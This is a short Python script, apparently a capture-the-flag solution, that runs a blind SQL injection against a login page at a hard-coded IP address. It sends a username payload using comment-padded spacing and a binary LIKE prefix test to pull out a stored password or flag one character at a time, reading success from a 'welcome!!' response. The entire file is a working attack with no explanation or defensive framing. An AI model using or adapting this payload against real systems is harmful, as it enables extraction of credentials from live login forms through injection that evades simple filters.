import requests
import string

url = 'http://34.66.139.33/auth.php'
flag = ''
for i in range(1,50):
	for j in string.ascii_letters+string.digits+'_{}':
		print(j,end='\r')
		temp = flag + j
		# print(temp)
		data = {"username":f"""'or/**/left(password,{i})/**/like/**/binary/**/"{temp}"#""","password":"a"}
		# print(data)
		r = requests.post(url=url,data=data,allow_redirects=False)
		# print(r.text)
		if "welcome!!" in r.text:
			flag += j
			print(flag)
			break